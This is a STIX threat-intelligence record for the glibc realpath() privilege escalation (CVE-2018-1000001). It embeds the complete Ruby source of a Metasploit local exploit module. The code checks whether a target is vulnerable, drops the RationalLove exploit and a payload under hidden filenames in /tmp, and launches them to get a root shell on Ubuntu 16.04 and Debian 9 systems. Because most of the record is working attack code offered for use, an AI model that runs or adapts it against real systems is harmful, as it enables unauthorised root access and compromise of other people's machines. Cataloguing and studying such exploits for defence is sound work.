{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--71417254-ef12-4a8e-98c6-555dfac9420d",
    "created": "2024-08-14T16:59:42.260733Z",
    "modified": "2024-08-14T16:59:42.260737Z",
    "name": "\"glibc realpath() Privilege Escalation\"",
    "description": " This module attempts to gain root privileges on Linux systems by abusing a vulnerability in GNU C Library (glibc) version 2.26 and prior.  This module uses halfdog's RationalLove exploit to exploit a buffer underflow in glibc realpath() and create a SUID root shell. The exploit has offsets for glibc versions 2.23-0ubuntu9 and 2.24-11+deb9u1.  The target system must have unprivileged user namespaces enabled.  This module has been tested successfully on Ubuntu Linux 16.04.3 (x86_64) with glibc version 2.23-0ubuntu9; and Debian 9.0 (x86_64) with glibc version 2.24-11+deb9u1.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/glibc_realpath_priv_esc.rb",
            "external_id": "glibc_realpath_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-1000001"
        },
        {
            "source_name": "reference",
            "url": "https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/"
        },
        {
            "source_name": "reference",
            "url": "http://www.openwall.com/lists/oss-security/2018/01/11/5"
        },
        {
            "source_name": "reference",
            "url": "https://securitytracker.com/id/1040162"
        },
        {
            "source_name": "reference",
            "url": "https://sourceware.org/bugzilla/show_bug.cgi?id=22679"
        },
        {
            "source_name": "reference",
            "url": "https://usn.ubuntu.com/3534-1/"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1533836"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"glibc 'realpath()' Privilege Escalation\",\n        'Description' => %q{\n          This module attempts to gain root privileges on Linux systems by abusing\n          a vulnerability in GNU C Library (glibc) version 2.26 and prior.\n\n          This module uses halfdog's RationalLove exploit to exploit a buffer\n          underflow in glibc realpath() and create a SUID root shell. The exploit\n          has offsets for glibc versions 2.23-0ubuntu9 and 2.24-11+deb9u1.\n\n          The target system must have unprivileged user namespaces enabled.\n\n          This module has been tested successfully on Ubuntu Linux 16.04.3 (x86_64)\n          with glibc version 2.23-0ubuntu9; and Debian 9.0 (x86_64) with glibc\n          version 2.24-11+deb9u1.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'halfdog', # Discovery and RationalLove.c exploit\n          'bcoles' # Metasploit\n        ],\n        'DisclosureDate' => '2018-01-16',\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [[ 'Auto', {} ]],\n        'Privileged' => true,\n        'References' => [\n          [ 'BID', '102525' ],\n          [ 'CVE', '2018-1000001' ],\n          [ 'EDB', '43775' ],\n          [ 'URL', 'https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/' ],\n          [ 'URL', 'http://www.openwall.com/lists/oss-security/2018/01/11/5' ],\n          [ 'URL', 'https://securitytracker.com/id/1040162' ],\n          [ 'URL', 'https://sourceware.org/bugzilla/show_bug.cgi?id=22679' ],\n          [ 'URL', 'https://usn.ubuntu.com/3534-1/' ],\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1533836' ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'AKA' => ['RationalLove.c']\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        }\n      )\n    )\n    register_options [\n      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', %w(Auto True False) ])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    cmd_exec \"chmod +x '#{path}'\"\n  end\n\n  def upload_and_compile(path, data)\n    upload \"#{path}.c\", data\n\n    gcc_cmd = \"gcc -w -o #{path} #{path}.c\"\n    if session.type.eql? 'shell'\n      gcc_cmd = \"PATH=$PATH:/usr/bin/ #{gcc_cmd}\"\n    end\n    output = cmd_exec gcc_cmd\n\n    unless output.blank?\n      print_error output\n      fail_with Failure::Unknown, \"#{path}.c failed to compile\"\n    end\n\n    register_file_for_cleanup path\n    cmd_exec \"chmod +x #{path}\"\n  end\n\n  def strip_comments(c_code)\n    c_code.gsub(%r{/\\*.*?\\*/}m, '').gsub(%r{^\\s*//.*$}, '')\n  end\n\n  def exploit_data(file)\n    ::File.binread ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2018-1000001', file)\n  end\n\n  def live_compile?\n    return false unless datastore['COMPILE'].eql?('Auto') || datastore['COMPILE'].eql?('True')\n\n    if has_gcc?\n      vprint_good 'gcc is installed'\n      return true\n    end\n\n    unless datastore['COMPILE'].eql? 'Auto'\n      fail_with Failure::BadConfig, 'gcc is not installed. Compiling will fail.'\n    end\n  end\n\n  def check\n    version = kernel_release\n    if Rex::Version.new(version.split('-').first) < Rex::Version.new('2.6.36')\n      vprint_error \"Linux kernel version #{version} is not vulnerable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"Linux kernel version #{version} is vulnerable\"\n\n    arch = kernel_hardware\n    unless arch.include? 'x86_64'\n      vprint_error \"System architecture #{arch} is not supported\"\n      return CheckCode::Safe\n    end\n    vprint_good \"System architecture #{arch} is supported\"\n\n    version = glibc_version\n    if Rex::Version.new(version.split('-').first) > Rex::Version.new('2.26')\n      vprint_error \"GNU C Library version #{version} is not vulnerable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"GNU C Library version #{version} is vulnerable\"\n\n    # fuzzy match glibc 2.23-0ubuntu9 and 2.24-11+deb9u1\n    glibc_banner = cmd_exec('ldd --version')\n    unless glibc_banner.include?('2.23-0ubuntu') || glibc_banner.include?('2.24-11+deb9')\n      vprint_error 'No offsets for this version of GNU C Library'\n      return CheckCode::Safe\n    end\n\n    config = kernel_config\n    if config.nil?\n      vprint_error 'Could not retrieve kernel config'\n      return CheckCode::Unknown\n    end\n\n    unless config.include? 'CONFIG_USER_NS=y'\n      vprint_error 'Kernel config does not include CONFIG_USER_NS'\n      return CheckCode::Safe\n    end\n    vprint_good 'Kernel config has CONFIG_USER_NS enabled'\n\n    unless userns_enabled?\n      vprint_error 'Unprivileged user namespaces are not permitted'\n      return CheckCode::Safe\n    end\n    vprint_good 'Unprivileged user namespaces are permitted'\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    # Upload exploit executable\n    executable_name = \".#{rand_text_alphanumeric rand(5..10)}\"\n    @executable_path = \"#{base_dir}/#{executable_name}\"\n    if live_compile?\n      vprint_status 'Live compiling exploit on system...'\n      upload_and_compile @executable_path, strip_comments(exploit_data('RationalLove.c'))\n    else\n      vprint_status 'Dropping pre-compiled exploit on system...'\n      upload_and_chmodx @executable_path, exploit_data('RationalLove')\n    end\n\n    # Upload payload executable\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    # Launch exploit\n    print_status 'Launching exploit...'\n    output = cmd_exec \"echo '#{payload_path} & exit' | #{@executable_path}\", nil, 30\n    output.each_line { |line| vprint_status line.chomp }\n  end\n\n  def on_new_session(client)\n    # remove root owned SUID executable\n    if client.type.eql? 'meterpreter'\n      client.core.use 'stdapi' unless client.ext.aliases.include? 'stdapi'\n      client.fs.file.rm @executable_path\n    else\n      client.shell_command_token \"rm #{@executable_path}\"\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-01-16",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}